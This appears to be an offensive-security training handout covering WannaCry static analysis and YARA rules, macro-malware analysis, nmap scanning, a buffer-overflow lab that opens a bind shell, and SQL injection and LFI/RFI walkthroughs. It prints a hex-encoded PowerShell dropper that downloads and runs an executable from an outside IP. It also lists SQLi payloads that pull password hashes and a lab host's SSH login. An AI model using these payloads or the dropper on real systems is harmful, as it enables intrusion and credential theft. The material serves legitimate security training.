@@ -1,0 +1,2078 @@
+##############################################################################
+# Offensive/Defensive Cyber   (God help me do something else other than RMF #
+# By Joe McCray                                                             #
+#############################################################################
+
+
+
+
+
+###########################
+# Where can I learn Linux #
+###########################
+- Here is a good set of slides for getting started with Linux:
+http://www.slideshare.net/olafusimichael/linux-training-24086319
+ 
+ 
+- Here is a good tutorial that you should complete before doing the labs below:
+http://linuxsurvival.com/linux-tutorial-introduction/
+ 
+ 
+- I prefer to use Putty to SSH into my Linux host.
+- You can download Putty from here:
+- http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe
+ 
+Here is the information to put into putty
+ 
+Host Name:          107.191.39.106
+protocol:           ssh
+port:               22
+username:           godhelpme
+password:           iHateRMF!#         
+ 
+ 
+
+
+---------------------------Type This-----------------------------------
+
+cd ~/static_analysis
+ 
+wget http://45.63.104.73/wannacry.zip
+ 
+unzip wannacry.zip
+     infected
+ 
+file wannacry.exe
+ 
+cp wannacry.exe malware.pdf
+ 
+file malware.pdf
+ 
+hexdump -n 2 -C wannacry.exe
+ 
+----------------------------------------------------------------------
+ 
+ 
+***What is '4d 5a' or 'MZ'***
+-------------------------Paste this URL into Firefox-----------------------------------
+http://www.garykessler.net/library/file_sigs.html
+--------------------------------------------------------------------------------------- 
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+objdump -x wannacry.exe
+ 
+strings wannacry.exe
+ 
+strings wannacry.exe | grep -i dll
+ 
+strings wannacry.exe | grep -i library
+ 
+strings wannacry.exe | grep -i reg
+ 
+strings wannacry.exe | grep -i key
+ 
+strings wannacry.exe | grep -i rsa
+ 
+strings wannacry.exe | grep -i open
+ 
+strings wannacry.exe | grep -i get
+ 
+strings wannacry.exe | grep -i mutex
+ 
+strings wannacry.exe | grep -i irc
+ 
+strings wannacry.exe | grep -i join        
+ 
+strings wannacry.exe | grep -i admin
+ 
+strings wannacry.exe | grep -i list
+----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+pe info wannacry.exe
+pe check wannacry.exe
+pe dump --section text wannacry.exe
+pe dump --section data wannacry.exe
+pe dump --section rsrc wannacry.exe
+pe dump --section reloc wannacry.exe
+strings rdata | less
+strings rsrc | less
+strings text | less
+----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+Hmmmmm.......what's the latest thing in the news - oh yeah "WannaCry"
+ 
+Quick Google search for "wannacry ransomeware analysis"
+ 
+ 
+Reference
+https://securingtomorrow.mcafee.com/executive-perspectives/analysis-wannacry-ransomware-outbreak/
+ 
+- Yara Rule -
+ 
+ 
+Strings:
+$s1 = “Ooops, your files have been encrypted!” wide ascii nocase
+$s2 = “Wanna Decryptor” wide ascii nocase
+$s3 = “.wcry” wide ascii nocase
+$s4 = “WANNACRY” wide ascii nocase
+$s5 = “WANACRY!” wide ascii nocase
+$s7 = “icacls . /grant Everyone:F /T /C /Q” wide ascii nocase
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+Ok, let's look for the individual strings
+ 
+ 
+---------------------------Type This-----------------------------------
+strings wannacry.exe | grep -i ooops
+ 
+strings wannacry.exe | grep -i wanna
+ 
+strings wannacry.exe | grep -i wcry
+ 
+strings wannacry.exe | grep -i wannacry
+ 
+strings wannacry.exe | grep -i wanacry          **** Matches $s5, hmmm.....
+----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+####################################
+# Tired of GREP - let's try Python #
+####################################
+Decided to make my own script for this kind of stuff in the future. I
+ 
+Reference1:
+http://45.63.104.73/analyse_malware.py
+ 
+This is a really good script for the basics of static analysis
+ 
+Reference:
+https://joesecurity.org/reports/report-db349b97c37d22f5ea1d1841e3c89eb4.html
+ 
+ 
+This is really good for showing some good signatures to add to the Python script
+ 
+ 
+Here is my own script using the signatures (started this yesterday, but still needs work):
+https://pastebin.com/guxzCBmP
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+wget https://pastebin.com/raw/guxzCBmP
+ 
+ 
+mv guxzCBmP am.py
+ 
+ 
+nano am.py
+ 
+python2.7 am.py wannacry.exe
+----------------------------------------------------------------------
+ 
+ 
+ 
+##############
+# Yara Ninja #
+##############
+ 
+Reference:
+https://securingtomorrow.mcafee.com/executive-perspectives/analysis-wannacry-ransomware-outbreak/
+ 
+----------------------------------------------------------------------------
+rule wannacry_1 : ransom
+{
+    meta:
+        author = "Joshua Cannell"
+        description = "WannaCry Ransomware strings"
+        weight = 100
+        date = "2017-05-12"
+ 
+    strings:
+        $s1 = "Ooops, your files have been encrypted!" wide ascii nocase
+        $s2 = "Wanna Decryptor" wide ascii nocase
+        $s3 = ".wcry" wide ascii nocase
+        $s4 = "WANNACRY" wide ascii nocase
+        $s5 = "WANACRY!" wide ascii nocase
+        $s7 = "icacls . /grant Everyone:F /T /C /Q" wide ascii nocase
+ 
+    condition:
+        any of them
+}
+ 
+----------------------------------------------------------------------------
+rule wannacry_2{
+    meta:
+        author = "Harold Ogden"
+        description = "WannaCry Ransomware Strings"
+        date = "2017-05-12"
+        weight = 100
+ 
+    strings:
+        $string1 = "msg/m_bulgarian.wnry"
+        $string2 = "msg/m_chinese (simplified).wnry"
+        $string3 = "msg/m_chinese (traditional).wnry"
+        $string4 = "msg/m_croatian.wnry"
+        $string5 = "msg/m_czech.wnry"
+        $string6 = "msg/m_danish.wnry"
+        $string7 = "msg/m_dutch.wnry"
+        $string8 = "msg/m_english.wnry"
+        $string9 = "msg/m_filipino.wnry"
+        $string10 = "msg/m_finnish.wnry"
+        $string11 = "msg/m_french.wnry"
+        $string12 = "msg/m_german.wnry"
+        $string13 = "msg/m_greek.wnry"
+        $string14 = "msg/m_indonesian.wnry"
+        $string15 = "msg/m_italian.wnry"
+        $string16 = "msg/m_japanese.wnry"
+        $string17 = "msg/m_korean.wnry"
+        $string18 = "msg/m_latvian.wnry"
+        $string19 = "msg/m_norwegian.wnry"
+        $string20 = "msg/m_polish.wnry"
+        $string21 = "msg/m_portuguese.wnry"
+        $string22 = "msg/m_romanian.wnry"
+        $string23 = "msg/m_russian.wnry"
+        $string24 = "msg/m_slovak.wnry"
+        $string25 = "msg/m_spanish.wnry"
+        $string26 = "msg/m_swedish.wnry"
+        $string27 = "msg/m_turkish.wnry"
+        $string28 = "msg/m_vietnamese.wnry"
+ 
+ 
+    condition:
+        any of ($string*)
+}
+----------------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+#####################################################
+# Analyzing Macro Embedded Malware                  #
+#####################################################
+---------------------------Type This-----------------------------------
+mkdir ~/oledump
+ 
+cd ~/oledump
+ 
+wget http://didierstevens.com/files/software/oledump_V0_0_22.zip
+ 
+unzip oledump_V0_0_22.zip
+ 
+wget http://45.63.104.73/064016.zip
+ 
+unzip 064016.zip
+     infected
+ 
+python oledump.py 064016.doc
+ 
+python oledump.py 064016.doc -s A4 -v
+ -----------------------------------------------------------------------
+ 
+ 
+ 
+- From this we can see this Word doc contains an embedded file called editdata.mso which contains seven data streams.
+- Three of the data streams are flagged as macros: A3:’VBA/Module1′, A4:’VBA/Module2′, A5:’VBA/ThisDocument’.
+ 
+---------------------------Type This-----------------------------------
+python oledump.py 064016.doc -s A5 -v
+-----------------------------------------------------------------------
+ 
+- As far as I can tell, VBA/Module2 does absolutely nothing. These are nonsensical functions designed to confuse heuristic scanners.
+ 
+---------------------------Type This-----------------------------------
+python oledump.py 064016.doc -s A3 -v
+ 
+- Look for "GVhkjbjv" and you should see:
+ 
+636D64202F4B20706F7765727368656C6C2E657865202D457865637574696F6E506F6C69637920627970617373202D6E6F70726F66696C6520284E65772D4F626A6563742053797374656D2E4E65742E576562436C69656E74292E446F776E6C6F616446696C652827687474703A2F2F36322E37362E34312E31352F6173616C742F617373612E657865272C272554454D50255C4A494F696F646668696F49482E63616227293B20657870616E64202554454D50255C4A494F696F646668696F49482E636162202554454D50255C4A494F696F646668696F49482E6578653B207374617274202554454D50255C4A494F696F646668696F49482E6578653B
+ 
+- Take that long blob that starts with 636D and finishes with 653B and paste it in:
+http://www.rapidtables.com/convert/number/hex-to-ascii.htm
+-----------------------------------------------------------------------
+
+
+
+Step 1: Download Nmap
+--------------------
+Windows: https://nmap.org/dist/nmap-7.70-setup.exe
+Mac OS X: https://nmap.org/dist/nmap-7.70.dmg
+ 
+Linux:
+--- Fedora/CentOS/RHEL:    sudo yum install -y nmap
+--- Ubuntu/Mint/Debian:    sudo apt-get install -y nmap
+ 
+ 
+ 
+########################
+# Scanning Methodology #
+########################
+ 
+- Ping Sweep
+What's alive?
+------------
+Note: On windows you won't need to use the word "sudo" in front of the command below:
+ 
+---------------------------On Linux or Mac OS X type This-----------------------------------
+sudo nmap -sP 157.166.226.*
+ 
+---------------------------or on Windows type:---------------------------------------------
+c:\nmap -sP 157.166.226.*
+ 
+--------------------------------------------------------------------------------------------
+ 
+ 
+ 
+    -if -SP yields no results try:
+Note: On windows you won't need to use the word "sudo" in front of the command below:
+---------------------------On Linux or Mac OS X type This-----------------------------------
+sudo nmap -sL 157.166.226.*
+ 
+---------------------------or on Windows type:---------------------------------------------
+c:\nmap -sL 157.166.226.*
+ 
+------------------------------------------------------------------------------------------
+ 
+ 
+ 
+    -Look for hostnames:
+Note: On windows you won't need to use the word "sudo" in front of the command below:
+---------------------------On Linux or Mac OS X type This-----------------------------------
+sudo nmap -sL 157.166.226.* | grep com
+ 
+---------------------------or on Windows type:---------------------------------------------
+c:\nmap -sP 157.166.226.* | findstr "cnn"
+ 
+-------------------------------------------------------------------------------------------
+ 
+ 
+ 
+- Port Scan
+What's where?
+------------
+Note: On windows you won't need to use the word "sudo" in front of the command below:
+---------------------------On Linux or Mac OS X type This-----------------------------------
+sudo nmap -sS 162.243.126.247
+ 
+---------------------------or on Windows type:----------------------------------------------
+c:\nmap -sS 162.243.126.247
+ 
+--------------------------------------------------------------------------------------------
+ 
+ 
+ 
+- Bannergrab/Version Query
+What versions of software are running
+-------------------------------------
+Note: On windows you won't need to use the word "sudo" in front of the command below:
+---------------------------On Linux or Mac OS X type This-----------------------------------
+sudo nmap -sV 162.243.126.247
+ 
+---------------------------or on Windows type:---------------------------------------------
+c:\nmap -sV 162.243.126.247
+-------------------------------------------------------------------------------------------
+ 
+ 
+ 
+Let's dig into this a little bit more:
+-------------------------------------
+Note: On windows you won't need to use the word "sudo" in front of the command below:
+---------------------------On Linux or Mac OS X type This-----------------------------------
+sudo nmap -sV --script=http-headers 162.243.126.247 -p 80,443
+ 
+---------------------------or on Windows type:---------------------------------------------
+c:\nmap -sV --script=http-headers 162.243.126.247 -p 80,443
+-------------------------------------------------------------------------------------------
+ 
+ 
+ 
+- Vulnerability Research
+Lookup the banner versions for public exploits
+----------------------------------------------
+http://exploit-db.com
+http://securityfocus.com/bid
+https://packetstormsecurity.com/files/tags/exploit/
+ 
+---------------------------------------------------------------------------------------------------------------------------------
+
+
+
+Network Penetration Testing Process (known vulnerabilities)
+-----------------------------------------------------------
+ 
+ 
+1. Ping Sweep:
+The purpose of this step is to identify live hosts
+ 
+    nmap -sP <ip-address/ip-range>
+ 
+ 
+2. Port Scan
+Identify running services. We use the running services to map the network topology.
+ 
+    nmap -sS <ip-address/ip-range>
+ 
+ 
+3. Bannergrab
+Identify the version of version of software running on each port
+ 
+    nmap -sV <ip-address/ip-range>
+   
+ 
+ 
+4. Vulnerability Research
+Use the software version number to research and determine if it is out of date (vulnerable).
+ 
+    exploit-db.com/search
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+Skill Level 1. Run the scanners
+-------------------------------
+    Nexpose
+    Qualys
+    Retina
+    Nessus              known vulnerabilities
+    OpenVas
+    Foundscan
+    GFI LanGuard
+    NCircle
+ 
+ 
+Skill Level 2. Manual vulnerability validation (known vulnerabilities)
+-----------------------------------------------------------------------
+ 
+    windows ->  systeminfo
+    Linux->     dpkg -l
+            rpm -qa
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+#####################################
+# Quick Stack Based Buffer Overflow #
+#####################################
+ 
+- You can download everything you need for this exercise from the links below (copy nc.exe into the c:\windows\system32 directory)
+http://45.63.104.73/ExploitLab.zip
+ 
+ 
+- Extract the ExploitLab.zip file to your Desktop
+ 
+- Go to folder on your desktop ExploitLab\2-VulnServer, and run vulnserv.exe
+ 
+
+
+- Open a new command prompt and type:
+ 
+---------------------------Type This-----------------------------------
+nc localhost 9999
+--------------------------------------------------------------------------
+
+If you don't have netcat you can download it from here:
+http://45.63.104.73/nc-password-is-netcat.zip
+
+The file nc.zip is password protected (password is 'password'), you'll have to exclude it from your anti-virus and either add it to your PATH, or copy it to your c:\Windows\System32\ folder.
+
+ 
+- In the new command prompt window where you ran nc type:
+HELP
+ 
+- Go to folder C:\Users\student\Desktop\ExploitLab\4-AttackScripts
+- Right-click on 1-simplefuzzer.py and choose the option edit with notepad++
+ 
+- Now double-click on 1-simplefuzzer.py
+- You'll notice that vulnserv.exe crashes. Be sure to note what command and the number of As it crashed on.
+ 
+ 
+- Restart vulnserv, and run 1-simplefuzzer.py again. Be sure to note what command and the number of As it crashed on.
+ 
+- Now go to folder C:\Users\student\Desktop\ExploitLab\3-OllyDBG and start OllyDBG. Choose 'File' -> 'Attach' and attach to process vulnserv.exe
+ 
+- Go back to folder C:\Users\student\Desktop\ExploitLab\4-AttackScripts and double-click on 1-simplefuzzer.py.
+ 
+- Take note of the registers (EAX, ESP, EBP, EIP) that have been overwritten with As (41s).
+ 
+- Now isolate the crash by restarting your debugger and running script 2-3000chars.py
+ 
+- Calculate the distance to EIP by running script 3-3000chars.py
+- This script sends 3000 nonrepeating chars to vulserv.exe and populates EIP with the value: 396F4338
+ 
+4-count-chars-to-EIP.py
+- In the previous script we see that EIP is overwritten with 396F4338 is 8 (38), C (43), o (6F), 9 (39)
+- so we search for 8Co9 in the string of nonrepeating chars and count the distance to it
+ 
+5-2006char-eip-check.py
+- In this script we check to see if our math is correct in our calculation of the distance to EIP by overwriting EIP with 42424242
+ 
+6-jmp-esp.py
+- In this script we overwrite EIP with a JMP ESP (6250AF11) inside of essfunc.dll
+ 
+7-first-exploit
+- In this script we actually do the stack overflow and launch a bind shell on port 4444
+ 
+8 - Take a look at the file vulnserv.rb and place it in your Ubuntu host via SCP or copy it and paste the code into the host.
+ 
+ 
+------------------------------
+ 
+ 
+ 
+Skill Level 3. Identify unknown vulnerabilities
+-----------------------------------------------
+ 
+- App Type
+------------
+    Stand Alone             Client Server               Web App
+ 
+                        ***(vulnerserver.exe)***
+ 
+ 
+- Input TYpe
+-------------
+    FIle                    logical network port            Browser
+    Keyboard
+    Mouse
+ 
+ 
+ 
+                        ***(9999)***
+ 
+ 
+- Map & Fuzz app entry points:
+------------------------------
+    - Commands              ***(commands)***
+    - Methods
+    - Verbs
+    - functions
+    - subroutines
+    - controllers
+ 
+ 
+- Isolate the crash
+-------------------
+App seems to reliably crash at TRUN 2100
+ 
+ 
+- Calculate the distance to EIP
+-------------------------------
+Distance to EIP is 2006
+ 
+We found that EIP was populated with the value: 396F4338
+396F4338 is 8 (38), C (43), o (6F), 9 (39) so we search for 8Co9 in the non_repeating pattern
+ 
+An online tool that we can use for this is:
+https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html
+ 
+ 
+ 
+- Redirect Program Execution
+----------------------------
+A 3rd party dll named essfunc.dll seems to be the best candidate for the 'JMP ESP' instruction.
+We learned that we control EAX and ESP in script 2.
+ 
+ 
+ 
+ 
+ 
+- Implement Shellcode
+---------------------
+There are only 2 things that can go wrong with shellcode:
+- Not enough space
+- Bad characters
+ 
+ 
+ 
+ 
+ 
+ 
+#########################################
+# FreeFloat FTP Server Exploit Analysis #
+#########################################
+ 
+ 
+ 
+Analyze the following exploit code:
+https://www.exploit-db.com/exploits/15689/
+ 
+1. What is the target platform that this exploit works against?
+2. What is the variable name for the distance to EIP?
+3. What is the actual distance to EIP in bytes?
+4. Describe what is happening in the variable ‘junk2’
+ 
+ 
+ 
+ 
+Analysis of the training walk-through based on EID: 15689:
+http://45.63.104.73/ff.zip
+ 
+ 
+ 
+ 
+ff1.py
+1. What does the sys module do?
+2. What is sys.argv[1] and sys.argv[2]?
+3. What application entry point is being attacked in this script?
+ 
+ 
+ 
+ff2.py
+1. Explain what is happening in lines 18 - 20 doing.
+2. What is pattern_create.rb doing and where can I find it?
+3. Why can’t I just double click the file to run this script?
+ 
+ 
+ 
+ff3.py
+1. Explain what is happening in lines 17 - to 25?
+2. Explain what is happening in lines 30 - to 32?
+3. Why is everything below line 35 commented out?
+ 
+ 
+ 
+ff4.py
+1. Explain what is happening in lines 13 to 15.
+2. Explain what is happening in line 19.
+3. What is the total length of buff?
+ 
+ 
+ 
+ff5.py
+1. Explain what is happening in line 15.
+2. What is struct.pack?
+3. How big is the shellcode in this script?
+ 
+ 
+ 
+ff6.py
+1. What is the distance to EIP?
+2. How big is the shellcode in this script?
+3. What is the total byte length of the data being sent to this app?
+ 
+ 
+ 
+ 
+ff7.py
+1. What is a tuple in python?
+2. How big is the shellcode in this script?
+3. Did your app crash in from this script?
+ 
+ 
+ 
+ 
+ff8.py
+1. How big is the shellcode in this script?
+2. What is try/except in python?
+3. What is socket.SOCK_STREAM in Python?
+ 
+ 
+ 
+ff9.py
+1. What is going on in lines 19 and 20?
+2. What is the length of the NOPs?
+3. From what DLL did the address of the JMP ESP come from?
+ 
+ 
+ 
+ 
+ff010.py
+1. What is going on in lines 18 - 20?
+2. What is going on in lines 29 - 32?
+3. How would a stack adjustment help this script?
+
+##################################
+# Basic: Web Application Testing #
+##################################
+ 
+Most people are going to tell you reference the OWASP Testing guide.
+https://www.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents
+ 
+I'm not a fan of it for the purpose of actual testing. It's good for defining the scope of an assessment, and defining attacks, but not very good for actually attacking a website.
+ 
+ 
+The key to doing a Web App Assessment is to ask yourself the 3 web questions on every page in the site.
+   
+    1. Does the website talk to a DB?
+        - Look for parameter passing (ex: site.com/page.php?id=4)
+        - If yes - try SQL Injection
+ 
+    2. Can I or someone else see what I type?
+        - If yes - try XSS
+ 
+    3. Does the page reference a file?
+        - If yes - try LFI/RFI
+ 
+Let's start with some manual testing against 45.63.104.73
+ 
+ 
+#######################
+# Attacking PHP/MySQL #
+#######################
+ 
+Go to LAMP Target homepage
+http://45.63.104.73/
+ 
+ 
+ 
+Clicking on the Acer Link:
+http://45.63.104.73/acre2.php?lap=acer
+ 
+   - Found parameter passing (answer yes to question 1)
+   - Insert ' to test for SQLI
+ 
+---------------------------Type This-----------------------------------
+ 
+http://45.63.104.73/acre2.php?lap=acer'
+ 
+-----------------------------------------------------------------------
+ 
+Page returns the following error:
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '''acer''' at line 1
+ 
+ 
+ 
+In order to perform union-based sql injection - we must first determine the number of columns in this query.
+We do this using the ORDER BY
+ 
+---------------------------Type This-----------------------------------
+ 
+http://45.63.104.73/acre2.php?lap=acer' order by 100-- +
+-----------------------------------------------------------------------
+ 
+Page returns the following error:
+Unknown column '100' in 'order clause'
+ 
+ 
+---------------------------Type This-----------------------------------
+ 
+http://45.63.104.73/acre2.php?lap=acer' order by 50-- +
+-----------------------------------------------------------------------
+ 
+Page returns the following error:
+Unknown column '50' in 'order clause'
+ 
+ 
+---------------------------Type This-----------------------------------
+ 
+http://45.63.104.73/acre2.php?lap=acer' order by 25-- +
+-----------------------------------------------------------------------
+ 
+Page returns the following error:
+Unknown column '25' in 'order clause'
+ 
+ 
+---------------------------Type This-----------------------------------
+ 
+http://45.63.104.73/acre2.php?lap=acer' order by 12-- +
+-----------------------------------------------------------------------
+ 
+Page returns the following error:
+Unknown column '12' in 'order clause'
+ 
+ 
+---------------------------Type This-----------------------------------
+ 
+http://45.63.104.73/acre2.php?lap=acer' order by 6-- +
+-----------------------------------------------------------------------
+ 
+---Valid page returned for 5 and 6...error on 7 so we know there are 6 columns
+ 
+ 
+ 
+Now we build out the union all select statement with the correct number of columns
+ 
+Reference:
+http://www.techonthenet.com/sql/union.php
+ 
+ 
+---------------------------Type This-----------------------------------
+ 
+http://45.63.104.73/acre2.php?lap=acer' union all select 1,2,3,4,5,6-- +
+-----------------------------------------------------------------------
+ 
+ 
+ 
+Now we negate the parameter value 'acer' by turning into the word 'null':
+---------------------------Type This-----------------------------------
+ 
+http://45.63.104.73/acre2.php?lap=null' union all select 1,2,3,4,5,6-- j
+-----------------------------------------------------------------------
+ 
+We see that a 4 and a 5 are on the screen. These are the columns that will echo back data
+ 
+ 
+Use a cheat sheet for syntax:
+http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
+ 
+---------------------------Type This-----------------------------------
+ 
+http://45.63.104.73/acre2.php?lap=null' union all select 1,2,3,user(),5,6-- j
+ 
+http://45.63.104.73/acre2.php?lap=null' union all select 1,2,3,user(),version(),6-- j
+ 
+http://45.63.104.73/acre2.php?lap=null' union all select 1,2,3,user(),@@version,6-- +
+ 
+http://45.63.104.73/acre2.php?lap=null' union all select 1,2,3,user(),@@datadir,6-- +
+ 
+ 
+http://45.63.104.73/acre2.php?lap=null' union all select 1,2,3,user,password,6 from mysql.user -- a
+ 
+-----------------------------------------------------------------------
+ 
+ 
+ 
+########################
+# Question I get a lot #
+########################
+Sometimes students ask about the "-- j" or "-- +" that I append to SQL injection attack string.
+ 
+Here is a good reference for it:
+https://www.symantec.com/connect/blogs/mysql-injection-comments-comments
+ 
+Both attackers and penetration testers alike often forget that MySQL comments deviate from the standard ANSI SQL specification. The double-dash comment syntax was first supported in MySQL 3.23.3. However, in MySQL a double-dash comment "requires the second dash to be followed by at least one whitespace or control character (such as a space, tab, newline, and so on)." This double-dash comment syntax deviation is intended to prevent complications that might arise from the subtraction of negative numbers within SQL queries. Therefore, the classic SQL injection exploit string will not work against backend MySQL databases because the double-dash will be immediately followed by a terminating single quote appended by the web application. However, in most cases a trailing space needs to be appended to the classic SQL exploit string. For the sake of clarity we'll append a trailing space and either a "+" or a letter.
+ 
+ 
+ 
+ 
+#########################
+# File Handling Attacks #
+#########################
+ 
+Here we see parameter passing, but this one is actually a yes to question number 3 (reference a file)
+ 
+---------------------------Type This-----------------------------------
+ 
+http://45.63.104.73/showfile.php?filename=about.txt
+ 
+-----------------------------------------------------------------------
+ 
+ 
+See if you can read files on the file system:
+---------------------------Type This-----------------------------------
+ 
+http://45.63.104.73/showfile.php?filename=/etc/passwd
+-----------------------------------------------------------------------
+ 
+We call this attack a Local File Include or LFI.
+ 
+Now let's find some text out on the internet somewhere:
+https://www.gnu.org/software/hello/manual/hello.txt
+ 
+ 
+Now let's append that URL to our LFI and instead of it being Local - it is now a Remote File Include or RFI:
+ 
+---------------------------Type This-----------------------------------
+ 
+http://45.63.104.73/showfile.php?filename=https://www.gnu.org/software/hello/manual/hello.txt
+-----------------------------------------------------------------------
+ 
+#########################################################################################
+# SQL Injection                                                                         #
+# http://45.63.104.73/1-Intro_To_SQL_Intection.pptx #
+#########################################################################################
+ 
+ 
+- Another quick way to test for SQLI is to remove the paramter value
+ 
+ 
+#############################
+# Error-Based SQL Injection #
+#############################
+---------------------------Type This-----------------------------------
+ 
+http://45.77.162.239/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(0))--
+http://45.77.162.239/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(1))--
+http://45.77.162.239/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(2))--
+http://45.77.162.239/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(3))--
+http://45.77.162.239/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(4))--
+http://45.77.162.239/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(N))--     NOTE: "N" - just means to keep going until you run out of databases
+http://45.77.162.239/bookdetail.aspx?id=2 or 1 in (select top 1 name from sysobjects where xtype=char(85))--
+http://45.77.162.239/bookdetail.aspx?id=2 or 1 in (select top 1 name from sysobjects where xtype=char(85) and name>'bookmaster')--
+http://45.77.162.239/bookdetail.aspx?id=2 or 1 in (select top 1 name from sysobjects where xtype=char(85) and name>'sysdiagrams')--
+ 
+-----------------------------------------------------------------------
+ 
+ 
+ 
+#############################
+# Union-Based SQL Injection #
+#############################
+ 
+---------------------------Type This-----------------------------------
+ 
+http://45.77.162.239/bookdetail.aspx?id=2 order by 100--
+http://45.77.162.239/bookdetail.aspx?id=2 order by 50--
+http://45.77.162.239/bookdetail.aspx?id=2 order by 25--
+http://45.77.162.239/bookdetail.aspx?id=2 order by 10--
+http://45.77.162.239/bookdetail.aspx?id=2 order by 5--
+http://45.77.162.239/bookdetail.aspx?id=2 order by 6--
+http://45.77.162.239/bookdetail.aspx?id=2 order by 7--
+http://45.77.162.239/bookdetail.aspx?id=2 order by 8--
+http://45.77.162.239/bookdetail.aspx?id=2 order by 9--
+http://45.77.162.239/bookdetail.aspx?id=2 union all select 1,2,3,4,5,6,7,8,9--
+-----------------------------------------------------------------------
+ 
+   We are using a union select statement because we are joining the developer's query with one of our own.
+   Reference:
+   http://www.techonthenet.com/sql/union.php
+   The SQL UNION operator is used to combine the result sets of 2 or more SELECT statements.
+   It removes duplicate rows between the various SELECT statements.
+ 
+   Each SELECT statement within the UNION must have the same number of fields in the result sets with similar data types.
+ 
+---------------------------Type This-----------------------------------
+ 
+http://45.77.162.239/bookdetail.aspx?id=-2 union all select 1,2,3,4,5,6,7,8,9--
+-----------------------------------------------------------------------
+ 
+   Negating the paramter value (changing the id=2 to id=-2) will force the pages that will echo back data to be displayed.
+ 
+---------------------------Type This-----------------------------------
+ 
+http://45.77.162.239/bookdetail.aspx?id=-2 union all select 1,user,@@version,4,5,6,7,8,9--
+http://45.77.162.239/bookdetail.aspx?id=-2 union all select 1,user,@@version,@@servername,5,6,7,8,9--
+http://45.77.162.239/bookdetail.aspx?id=-2 union all select 1,user,@@version,@@servername,5,6,db_name(0),8,9--
+http://45.77.162.239/bookdetail.aspx?id=-2 union all select 1,user,@@version,@@servername,5,6,master.sys.fn_varbintohexstr(password_hash),8,9 from master.sys.sql_logins--
+ 
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+- Another way is to see if you can get the backend to perform an arithmetic function
+ 
+---------------------------Type This-----------------------------------
+ 
+http://45.77.162.239/bookdetail.aspx?id=(2)
+http://45.77.162.239/bookdetail.aspx?id=(4-2)  
+http://45.77.162.239/bookdetail.aspx?id=(4-1)
+ 
+ 
+ 
+http://45.77.162.239/bookdetail.aspx?id=2 or 1=1--
+http://45.77.162.239/bookdetail.aspx?id=2 or 1=2--
+http://45.77.162.239/bookdetail.aspx?id=1*1
+http://45.77.162.239/bookdetail.aspx?id=2 or 1 >-1#
+http://45.77.162.239/bookdetail.aspx?id=2 or 1<99#
+http://45.77.162.239/bookdetail.aspx?id=2 or 1<>1#
+http://45.77.162.239/bookdetail.aspx?id=2 or 2 != 3--
+http://45.77.162.239/bookdetail.aspx?id=2 &0#
+ 
+ 
+ 
+http://45.77.162.239/bookdetail.aspx?id=2 and 1=1--
+http://45.77.162.239/bookdetail.aspx?id=2 and 1=2--
+http://45.77.162.239/bookdetail.aspx?id=2 and user='joe' and 1=1--
+http://45.77.162.239/bookdetail.aspx?id=2 and user='dbo' and 1=1--
+ 
+-----------------------------------------------------------------------
+ 
+ 
+###############################
+# Blind SQL Injection Testing #
+###############################
+Time-Based BLIND SQL INJECTION - EXTRACT DATABASE USER
+   
+3 - Total Characters
+---------------------------Type This-----------------------------------
+ 
+http://45.77.162.239/bookdetail.aspx?id=2; IF (LEN(USER)=1) WAITFOR DELAY '00:00:10'--
+http://45.77.162.239/bookdetail.aspx?id=2; IF (LEN(USER)=2) WAITFOR DELAY '00:00:10'--
+http://45.77.162.239/bookdetail.aspx?id=2; IF (LEN(USER)=3) WAITFOR DELAY '00:00:10'--      (Ok, the username is 3 chars long - it waited 10 seconds)
+-----------------------------------------------------------------------
+ 
+Let's go for a quick check to see if it's DBO
+ 
+---------------------------Type This-----------------------------------
+ 
+http://45.77.162.239/bookdetail.aspx?id=2; IF ((USER)='dbo') WAITFOR DELAY '00:00:10'--
+-----------------------------------------------------------------------
+ 
+Yup, it waited 10 seconds so we know the username is 'dbo' - let's give you the syntax to verify it just for fun.
+ 
+---------------------------Type This-----------------------------------
+ 
+D  - 1st Character
+http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=97) WAITFOR DELAY '00:00:10'--  
+http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=98) WAITFOR DELAY '00:00:10'--
+http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=99) WAITFOR DELAY '00:00:10'--
+http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=100) WAITFOR DELAY '00:00:10'--  (Ok, first letter is a 100 which is the letter 'd' - it waited 10 seconds)
+ 
+B - 2nd Character
+http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),2,1)))>97) WAITFOR DELAY '00:00:10'--   Ok, good it waited for 10 seconds
+http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),2,1)))=98) WAITFOR DELAY '00:00:10'--   Ok, good it waited for 10 seconds
+ 
+O - 3rd Character
+http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>97) WAITFOR DELAY '00:00:10'--   Ok, good it waited for 10 seconds
+http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>115) WAITFOR DELAY '00:00:10'--
